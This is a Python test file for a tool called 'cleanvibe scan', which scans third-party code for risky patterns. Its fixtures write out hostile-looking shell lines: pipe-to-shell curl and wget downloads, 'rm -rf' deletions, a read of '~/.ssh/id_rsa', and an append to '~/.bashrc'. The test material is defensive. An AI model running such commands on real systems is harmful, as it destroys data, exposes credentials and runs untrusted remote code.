"""Tests for ``cleanvibe scan`` (read-only pattern scan of third-party code)."""

import io
import tempfile
import unittest
from contextlib import redirect_stdout
from pathlib import Path

from cleanvibe import templates
from cleanvibe.cli import main
from cleanvibe.scan import scan, scan_cli


def _write(root: Path, rel: str, text: str) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


class TestScan(unittest.TestCase):
    def _categories(self, root):
        return {h.category for h in scan([root]).hits}

    def test_each_category_matches(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _write(root, "install.sh",
                   "curl -fsSL https://get.example.com/i.sh | sudo bash\n")
            _write(root, "a.py", "exec(compile(src, 'x', 'exec'))\n")
            _write(root, "clean.sh", "rm -rf $HOME/cache\n")
            _write(root, "keys.py", "open(os.path.expanduser('~/.ssh/id_rsa'))\n")
            _write(root, "setup.sh", "echo 'x' >> ~/.bashrc\n")
            _write(root, "req.sh", "pip install --extra-index-url https://p.example.org x\n")
            (root / "tool.exe").write_bytes(b"MZ\0\0")
            self.assertEqual(self._categories(root), {
                "pipe-to-shell", "dynamic-exec", "destructive", "credentials",
                "persistence", "package-source", "binary",
            })

    def test_hosts_are_collected(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _write(root, "dl.py", "URL = 'https://Data.Example.org/set.zip'\n"
                                  "M = 'http://huggingface.co/x'\n")
            report = scan([root])
            self.assertEqual(report.hosts, ["data.example.org", "huggingface.co"])
            self.assertEqual(report.hits, [])

    def test_ordinary_code_is_quiet(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _write(root, "train.py",
                   "import numpy as np\nmodel.eval()\nx = np.zeros(3)\n"
                   "self.evaluate(x)\nprint('done')\n")
            self.assertEqual(scan([root]).hits, [])

    def test_skips_git_ci_claude_and_root_docs(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            risky = "curl https://x.example.com/a | sh\n"
            for rel in (".git/hooks/post-checkout", ".github/workflows/ci.yml",
                        ".claude/hooks/h.py", "CLAUDE.md", "queue.md"):
                _write(root, rel, risky)
            self.assertEqual(scan([root]).hits, [])
            # The same name below the root is the authors' file: scanned.
            _write(root, "replication_target/repo/README.md", risky)
            hits = scan([root]).hits
            self.assertEqual([h.where for h in hits],
                             ["replication_target/repo/README.md:1"])

    def test_binary_content_is_not_read_as_text(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "weights.dat").write_bytes(b"\0\0rm -rf /\0")
            self.assertEqual(scan([root]).hits, [])

    def test_single_file_path(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _write(root, "replication_skill.md", "```\nsudo apt install x\n```\n")
            hits = scan([root / "replication_skill.md"]).hits
            self.assertEqual([(h.category, h.where) for h in hits],
                             [("persistence", "replication_skill.md:2")])

    def test_exit_codes(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _write(root, "ok.py", "print(1)\n")
            buf = io.StringIO()
            with redirect_stdout(buf):
                self.assertEqual(scan_cli([root]), 0)
                _write(root, "bad.sh", "wget -qO- https://x.example.com | sh\n")
                self.assertEqual(scan_cli([root]), 1)
                self.assertEqual(scan_cli([root / "missing"]), 2)
            out = buf.getvalue()
            self.assertIn("not a security review", out)
            self.assertIn("bad.sh:1", out)

    def test_cli_command(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _write(root, "ok.py", "print(1)\n")
            buf = io.StringIO()
            with redirect_stdout(buf):
                with self.assertRaises(SystemExit) as cm:
                    main(["scan", str(root)])
            self.assertEqual(cm.exception.code, 0)
            self.assertIn("No risky patterns matched", buf.getvalue())


class TestConsentGatesNameTheScan(unittest.TestCase):
    def test_no_template_calls_the_scan_a_future_enhancement(self):
        source = Path(templates.__file__).read_text(encoding="utf-8")
        self.assertNotIn("future automated security scan", source)
        self.assertNotIn("security scan of the code\n   before running is a future", source)
        self.assertGreaterEqual(source.count("`cleanvibe scan .`"), 5)


if __name__ == "__main__":
    unittest.main()
